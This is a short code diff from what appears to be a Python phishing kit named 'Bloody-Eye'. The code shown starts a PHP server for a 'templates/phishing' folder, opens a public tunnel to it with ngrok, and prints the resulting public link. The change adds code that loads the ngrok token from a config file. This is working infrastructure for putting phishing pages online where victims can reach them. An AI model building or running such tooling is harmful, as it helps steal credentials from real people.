@@ -554,7 +554,9 @@ exit();""")
         Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
       print("")
       print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Php Server Has Started on Port 6060")
-
+      with open("../Bloody-Eye11/config.json", "r") as read_file:
+          data = json.load(read_file)
+          token = data["your_token"]
       link = ngrok.connect(6060,"http",auth_token=token)
       a_print_link = (Fore.RED+" ["+Fore.WHITE+"$"+Fore.RED+"]"+Fore.RED+" url1 : "+link)
       b_print_link = (a_print_link).replace("http","https")
